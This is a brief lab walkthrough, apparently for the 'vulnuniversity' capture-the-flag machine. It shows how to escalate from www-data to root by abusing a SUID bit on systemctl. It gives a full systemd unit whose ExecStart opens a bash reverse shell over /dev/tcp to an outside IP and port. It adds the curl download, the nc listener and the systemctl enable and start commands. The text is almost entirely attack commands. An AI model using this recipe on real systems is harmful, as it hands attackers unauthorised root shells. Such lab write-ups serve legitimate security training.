after you get a shell into the system as 

	www-data@vulnuniversity:/$ whoami
whoami
www-data



you find out you have SUID bit set on systemctl


now you create a file called root.service
withe below contents
	start
[Unit]
Description=roooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.18.20.174/9999 0>&1'

[Install]
WantedBy=multi-user.target
	end


now you can send this file over to target machine using

	python3 -m http.server 8000


on the target machcine run this command

	www-data@vulnuniversity:/tmp$ curl "http://10.18.20.174:8000/root.service" > root.service


also make sure you download in /tmp directory

now

start a nc listerner on the port you configured in root.service

	nc -lnvp 9999



now on the target machine


	www-data@vulnuniversity:/tmp$ /bin/systemctl enable root.service


Followed with

	www-data@vulnuniversity:/$ /bin/systemctl start root



now you will have a root shell on the netcat listerner


reference: https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49